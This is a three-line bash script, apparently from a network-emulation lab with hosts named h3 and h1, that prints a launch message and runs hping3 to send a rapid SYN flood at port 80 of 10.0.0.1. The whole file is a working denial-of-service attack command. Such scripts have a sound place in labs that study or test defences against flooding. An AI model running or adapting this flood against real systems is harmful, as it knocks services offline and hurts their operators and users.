#!/bin/bash
echo "Launching SYN Flood from h3 to h1..."
hping3 -S -p 80 -i u1000 10.0.0.1